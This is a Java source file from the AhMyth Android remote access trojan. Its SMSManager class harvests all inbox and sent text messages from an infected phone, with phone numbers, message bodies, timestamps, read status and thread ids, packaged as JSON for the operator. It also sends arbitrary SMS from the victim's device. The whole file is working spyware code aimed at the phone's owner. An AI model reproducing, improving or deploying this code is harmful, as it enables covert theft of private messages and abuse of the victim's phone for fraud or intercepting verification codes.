package ahmyth.mine.king.ahmyth;

import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by AhMyth on 11/10/16.
 */

public class SMSManager {

    public static JSONObject getSMSList(){

        try {
            JSONObject SMSList = new JSONObject();
            JSONArray list = new JSONArray();


            // Get inbox SMS
            Uri uriSMSURI = Uri.parse("content://sms/inbox");
            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(uriSMSURI, null, null, null, "date DESC");

            if (cur != null) {
            while (cur.moveToNext()) {
                JSONObject sms = new JSONObject();
                String address = cur.getString(cur.getColumnIndex("address"));
                String body = cur.getString(cur.getColumnIndexOrThrow("body"));
                sms.put("phoneNo", address);
                sms.put("msg", body);
                
                // Enhanced metadata
                try {
                    sms.put("date", cur.getLong(cur.getColumnIndex("date")));
                    sms.put("dateSent", cur.getLong(cur.getColumnIndex("date_sent")));
                    sms.put("read", cur.getInt(cur.getColumnIndex("read")) == 1);
                    sms.put("seen", cur.getInt(cur.getColumnIndex("seen")) == 1);
                    sms.put("type", cur.getInt(cur.getColumnIndex("type")));
                    sms.put("threadId", cur.getInt(cur.getColumnIndex("thread_id")));
                } catch (Exception e) {
                    // Some columns may not exist on all devices
                }
                list.put(sms);

            }
            cur.close();
            }
            
            // Get sent SMS
            Uri uriSentURI = Uri.parse("content://sms/sent");
            Cursor sentCur = MainService.getContextOfApplication().getContentResolver().query(uriSentURI, null, null, null, "date DESC");
            
            if (sentCur != null) {
            while (sentCur.moveToNext()) {
                JSONObject sms = new JSONObject();
                String address = sentCur.getString(sentCur.getColumnIndex("address"));
                String body = sentCur.getString(sentCur.getColumnIndexOrThrow("body"));
                sms.put("phoneNo", address);
                sms.put("msg", body);
                sms.put("type", "sent");
                
                // Enhanced metadata
                try {
                    sms.put("date", sentCur.getLong(sentCur.getColumnIndex("date")));
                    sms.put("dateSent", sentCur.getLong(sentCur.getColumnIndex("date_sent")));
                    sms.put("read", sentCur.getInt(sentCur.getColumnIndex("read")) == 1);
                    sms.put("threadId", sentCur.getInt(sentCur.getColumnIndex("thread_id")));
                } catch (Exception e) {
                    // Some columns may not exist
                }
                list.put(sms);
            }
            sentCur.close();
            }
            SMSList.put("smsList", list);
            Log.e("done" ,"collecting");
            return SMSList;
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return null;

    }

    public static boolean sendSMS(String phoneNo, String msg) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNo, null, msg, null, null);
            return true;
        } catch (Exception ex) {
            ex.printStackTrace();
            return false;
        }

    }


}
